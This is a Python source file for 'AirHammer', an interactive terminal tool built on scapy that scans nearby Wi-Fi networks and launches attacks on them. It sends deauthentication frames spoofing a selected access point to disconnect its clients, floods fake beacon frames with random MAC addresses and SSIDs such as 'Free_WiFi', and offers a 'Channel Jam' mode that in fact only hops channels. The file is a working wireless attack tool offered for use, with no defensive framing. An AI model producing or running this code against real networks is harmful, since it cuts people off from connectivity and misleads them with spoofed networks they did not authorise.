#!/usr/bin/env python3



import curses
import time
import random
import logging
import sys
import os
import threading
from queue import Queue
from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11Deauth, Dot11, RadioTap, Dot11Elt

# ===== CONFIGURATION =====
VERSION = "1.0"
SCAN_TIME = 15  # Seconds
LOG_FILE = "airhammer.log"
DEFAULT_SSIDS = ["Free_WiFi", "Public_WiFi", "Guest_Network"]

# ===== GLOBALS =====
stop_event = threading.Event()
packet_queue = Queue(maxsize=1000)

class WiFiTool:
    def __init__(self, interface):
        self.interface = interface
        self.networks = []
        self._validate_interface()
        self.mac_pool = [self._random_mac() for _ in range(100)]

    def _validate_interface(self):
        """Ensure interface exists and is in monitor mode"""
        if not os.path.exists(f"/sys/class/net/{self.interface}"):
            raise ValueError(f"Interface {self.interface} not found")
        
        result = os.popen(f"iwconfig {self.interface} 2>&1").read()
        if "Mode:Monitor" not in result:
            logging.warning("Setting interface to monitor mode...")
            os.system(f"sudo ifconfig {self.interface} down")
            os.system(f"sudo iwconfig {self.interface} mode monitor")
            os.system(f"sudo ifconfig {self.interface} up")

    def _random_mac(self):
        """Generate random MAC address"""
        return "02:" + ":".join(f"{random.randint(0,255):02x}" for _ in range(5))

    def scan(self):
        """Scan for nearby networks"""
        self.networks = []
        
        def _scan_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                try:
                    ssid = pkt[Dot11Elt].info.decode(errors='ignore') if pkt[Dot11Elt].info else "<hidden>"
                    bssid = pkt[Dot11].addr2
                    channel = int(ord(pkt[Dot11Elt:3].info))
                    
                    if not any(n['bssid'] == bssid for n in self.networks):
                        self.networks.append({
                            'ssid': ssid,
                            'bssid': bssid,
                            'channel': channel
                        })
                except Exception as e:
                    logging.error(f"Scan error: {e}")

        sniff(iface=self.interface, prn=_scan_handler, timeout=SCAN_TIME)
        return self.networks

    def deauth(self, target_bssid, count=100):
        """Send deauthentication packets"""
        for _ in range(count if count > 0 else 1000):
            if stop_event.is_set():
                break
            
            # Send to broadcast
            pkt = RadioTap() / Dot11(
                addr1="ff:ff:ff:ff:ff:ff",
                addr2=target_bssid,
                addr3=target_bssid,
                type=0, subtype=12
            ) / Dot11Deauth(reason=7)
            
            sendp(pkt, iface=self.interface, verbose=0)
            time.sleep(0.1)

    def beacon_flood(self, ssids=None, count=100):
        """Flood beacons with custom SSIDs"""
        ssids = ssids or DEFAULT_SSIDS
        for _ in range(count if count > 0 else 1000):
            if stop_event.is_set():
                break
            
            for ssid in ssids:
                pkt = RadioTap() / Dot11(
                    addr1="ff:ff:ff:ff:ff:ff",
                    addr2=self._random_mac(),
                    addr3=self._random_mac(),
                    type=0, subtype=8
                ) / Dot11Beacon(cap="ESS+privacy") / Dot11Elt(ID="SSID", info=ssid)
                
                sendp(pkt, iface=self.interface, verbose=0)
                time.sleep(0.05)

    def channel_hop(self, band="both"):
        """Continuously hop channels"""
        channels = {
            "2.4": [1, 6, 11],
            "5": [36, 40, 44, 48, 149, 153, 157, 161],
            "both": [1, 6, 11, 36, 40, 44, 48, 149, 153, 157, 161]
        }.get(band, [1, 6, 11])

        while not stop_event.is_set():
            for ch in channels:
                os.system(f"sudo iwconfig {self.interface} channel {ch} >/dev/null 2>&1")
                time.sleep(0.5)

class AirHammerUI:
    def __init__(self, stdscr):
        self.stdscr = stdscr
        self.tool = None
        self._init_ui()

    def _init_ui(self):
        """Setup the TUI"""
        curses.curs_set(0)
        curses.start_color()
        curses.init_pair(1, curses.COLOR_RED, curses.COLOR_BLACK)
        curses.init_pair(2, curses.COLOR_GREEN, curses.COLOR_BLACK)
        self.stdscr.nodelay(True)
        self.stdscr.timeout(100)

    def show_error(self, msg):
        """Display error message"""
        h, w = self.stdscr.getmaxyx()
        self.stdscr.addstr(h-2, 2, msg, curses.color_pair(1))
        self.stdscr.refresh()
        time.sleep(2)

    def select_interface(self):
        """Interface selection menu"""
        ifaces = [iface for iface in os.listdir('/sys/class/net/') 
                 if iface.startswith(('wlan', 'wlx', 'wlp'))]
        
        if not ifaces:
            self.show_error("No wireless interfaces found!")
            return False
        
        selection = 0
        while True:
            self.stdscr.clear()
            h, w = self.stdscr.getmaxyx()
            
            self.stdscr.addstr(1, 2, "Select Interface:", curses.A_BOLD)
            
            for i, iface in enumerate(ifaces):
                attr = curses.A_REVERSE if i == selection else curses.A_NORMAL
                self.stdscr.addstr(i+3, 4, iface, attr)
            
            self.stdscr.addstr(h-1, 2, "↑/↓: Navigate | Enter: Select | Q: Quit", curses.A_DIM)
            
            key = self.stdscr.getch()
            
            if key == curses.KEY_UP and selection > 0:
                selection -= 1
            elif key == curses.KEY_DOWN and selection < len(ifaces)-1:
                selection += 1
            elif key == ord('\n'):
                try:
                    self.tool = WiFiTool(ifaces[selection])
                    return True
                except Exception as e:
                    self.show_error(str(e))
                    return False
            elif key == ord('q'):
                return False
            
            self.stdscr.refresh()

    def main_menu(self):
        """Main application menu"""
        selection = 0
        options = [
            "Scan Networks",
            "Deauth Attack", 
            "Beacon Flood",
            "Channel Jam",
            "Exit"
        ]
        
        while True:
            self.stdscr.clear()
            h, w = self.stdscr.getmaxyx()
            
            self.stdscr.addstr(1, (w-20)//2, "AirHammer-FIXED", curses.A_BOLD)
            
            for i, opt in enumerate(options):
                attr = curses.A_REVERSE if i == selection else curses.A_NORMAL
                self.stdscr.addstr(i+3, 4, opt, attr)
            
            status = f"Interface: {self.tool.interface if self.tool else 'Not set'}"
            self.stdscr.addstr(h-2, 2, status, curses.A_DIM)
            self.stdscr.addstr(h-1, 2, "↑/↓: Navigate | Enter: Select | Q: Quit", curses.A_DIM)
            
            key = self.stdscr.getch()
            
            if key == curses.KEY_UP and selection > 0:
                selection -= 1
            elif key == curses.KEY_DOWN and selection < len(options)-1:
                selection += 1
            elif key == ord('\n'):
                if not self.tool and selection != len(options)-1:
                    self.show_error("Select interface first!")
                    continue
                
                if selection == 0:  # Scan
                    self.scan_networks()
                elif selection == 1:  # Deauth
                    self.deauth_menu()
                elif selection == 2:  # Beacon
                    self.beacon_menu()
                elif selection == 3:  # Jam
                    self.jam_menu()
                elif selection == 4:  # Exit
                    return
            elif key == ord('q'):
                return
            
            self.stdscr.refresh()

    def scan_networks(self):
        """Network scanning screen"""
        self.stdscr.clear()
        h, w = self.stdscr.getmaxyx()
        
        self.stdscr.addstr(1, 2, "Scanning networks...", curses.A_BOLD)
        self.stdscr.refresh()
        
        def scan_task():
            try:
                networks = self.tool.scan()
                self.show_networks(networks)
            except Exception as e:
                self.show_error(f"Scan failed: {str(e)}")
        
        threading.Thread(target=scan_task, daemon=True).start()
        
        # Show loading animation
        dots = 0
        start = time.time()
        while threading.active_count() > 1:
            elapsed = int(time.time() - start)
            status = "Scanning" + "." * (dots % 4) + f" ({elapsed}s)"
            self.stdscr.addstr(3, 2, status)
            dots += 1
            time.sleep(0.5)
            
            if self.stdscr.getch() == ord('q'):
                stop_event.set()
                break
        
        stop_event.clear()

    def show_networks(self, networks):
        """Display scan results"""
        if not networks:
            self.show_error("No networks found!")
            return
        
        selection = 0
        while True:
            self.stdscr.clear()
            h, w = self.stdscr.getmaxyx()
            
            self.stdscr.addstr(1, 2, "Discovered Networks:", curses.A_BOLD)
            self.stdscr.addstr(2, 2, "SSID", curses.A_UNDERLINE)
            self.stdscr.addstr(2, 30, "BSSID", curses.A_UNDERLINE)
            self.stdscr.addstr(2, 50, "Channel", curses.A_UNDERLINE)
            
            for i, net in enumerate(networks):
                attr = curses.A_REVERSE if i == selection else curses.A_NORMAL
                self.stdscr.addstr(i+3, 2, net['ssid'][:25], attr)
                self.stdscr.addstr(i+3, 30, net['bssid'], attr)
                self.stdscr.addstr(i+3, 50, str(net['channel']), attr)
            
            self.stdscr.addstr(h-1, 2, "↑/↓: Navigate | Enter: Select | Q: Back", curses.A_DIM)
            
            key = self.stdscr.getch()
            
            if key == curses.KEY_UP and selection > 0:
                selection -= 1
            elif key == curses.KEY_DOWN and selection < len(networks)-1:
                selection += 1
            elif key == ord('\n'):
                return networks[selection]
            elif key == ord('q'):
                return None
            
            self.stdscr.refresh()

    def deauth_menu(self):
        """Deauthentication attack menu"""
        target = self.show_networks(self.tool.networks)
        if not target:
            return
        
        self.stdscr.clear()
        h, w = self.stdscr.getmaxyx()
        
        self.stdscr.addstr(1, 2, f"Deauth Attack: {target['ssid']}", curses.A_BOLD)
        self.stdscr.addstr(3, 2, "Press any key to begin (Q to cancel)...")
        self.stdscr.addstr(5, 2, f"Target: {target['bssid']}")
        self.stdscr.addstr(6, 2, f"Channel: {target['channel']}")
        self.stdscr.refresh()
        
        key = self.stdscr.getch()
        if key == ord('q'):
            return
        
        self.stdscr.addstr(8, 2, "Running attack... (Q to stop)", curses.A_BOLD)
        self.stdscr.refresh()
        
        def attack_task():
            try:
                self.tool.deauth(target['bssid'])
            except Exception as e:
                self.show_error(f"Attack failed: {str(e)}")
        
        thread = threading.Thread(target=attack_task, daemon=True)
        thread.start()
        
        while thread.is_alive():
            if self.stdscr.getch() == ord('q'):
                stop_event.set()
                break
            time.sleep(0.1)
        
        stop_event.clear()
        self.stdscr.addstr(10, 2, "Attack stopped", curses.color_pair(2))
        self.stdscr.getch()

    def beacon_menu(self):
        """Beacon flood menu"""
        self.stdscr.clear()
        h, w = self.stdscr.getmaxyx()
        
        self.stdscr.addstr(1, 2, "Beacon Flood Attack", curses.A_BOLD)
        self.stdscr.addstr(3, 2, "Press any key to begin (Q to cancel)...")
        self.stdscr.addstr(5, 2, f"SSIDs: {', '.join(DEFAULT_SSIDS)}")
        self.stdscr.refresh()
        
        key = self.stdscr.getch()
        if key == ord('q'):
            return
        
        self.stdscr.addstr(7, 2, "Flooding beacons... (Q to stop)", curses.A_BOLD)
        self.stdscr.refresh()
        
        def flood_task():
            try:
                self.tool.beacon_flood()
            except Exception as e:
                self.show_error(f"Flood failed: {str(e)}")
        
        thread = threading.Thread(target=flood_task, daemon=True)
        thread.start()
        
        while thread.is_alive():
            if self.stdscr.getch() == ord('q'):
                stop_event.set()
                break
            time.sleep(0.1)
        
        stop_event.clear()
        self.stdscr.addstr(9, 2, "Flood stopped", curses.color_pair(2))
        self.stdscr.getch()

    def jam_menu(self):
        """Channel jamming menu"""
        selection = 0
        bands = ["2.4 GHz", "5 GHz", "Both", "Back"]
        
        while True:
            self.stdscr.clear()
            h, w = self.stdscr.getmaxyx()
            
            self.stdscr.addstr(1, 2, "Channel Jamming", curses.A_BOLD)
            
            for i, band in enumerate(bands):
                attr = curses.A_REVERSE if i == selection else curses.A_NORMAL
                self.stdscr.addstr(i+3, 4, band, attr)
            
            self.stdscr.addstr(h-1, 2, "↑/↓: Navigate | Enter: Select | Q: Back", curses.A_DIM)
            
            key = self.stdscr.getch()
            
            if key == curses.KEY_UP and selection > 0:
                selection -= 1
            elif key == curses.KEY_DOWN and selection < len(bands)-1:
                selection += 1
            elif key == ord('\n'):
                if selection == 3:  # Back
                    return
                
                band = ["2.4", "5", "both"][selection]
                self.run_jammer(band)
            elif key == ord('q'):
                return
            
            self.stdscr.refresh()

    def run_jammer(self, band):
        """Run channel jammer"""
        self.stdscr.clear()
        h, w = self.stdscr.getmaxyx()
        
        self.stdscr.addstr(1, 2, f"Jamming {band} GHz band", curses.A_BOLD)
        self.stdscr.addstr(3, 2, "Press any key to begin (Q to cancel)...")
        self.stdscr.refresh()
        
        key = self.stdscr.getch()
        if key == ord('q'):
            return
        
        self.stdscr.addstr(5, 2, "Jamming... (Q to stop)", curses.A_BOLD)
        self.stdscr.refresh()
        
        def jam_task():
            try:
                self.tool.channel_hop(band)
            except Exception as e:
                self.show_error(f"Jamming failed: {str(e)}")
        
        thread = threading.Thread(target=jam_task, daemon=True)
        thread.start()
        
        while thread.is_alive():
            if self.stdscr.getch() == ord('q'):
                stop_event.set()
                break
            time.sleep(0.1)
        
        stop_event.clear()
        self.stdscr.addstr(7, 2, "Jamming stopped", curses.color_pair(2))
        self.stdscr.getch()

def main(stdscr):
    # Check root
    if os.geteuid() != 0:
        stdscr.addstr(0, 0, "ERROR: Requires root privileges!", curses.A_BOLD | curses.color_pair(1))
        stdscr.getch()
        return
    
    # Setup UI
    ui = AirHammerUI(stdscr)
    
    # First select interface
    if not ui.select_interface():
        return
    
    # Run main menu
    ui.main_menu()

if __name__ == "__main__":
    try:
        curses.wrapper(main)
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
    finally:
        stop_event.set()
        sys.exit(0)
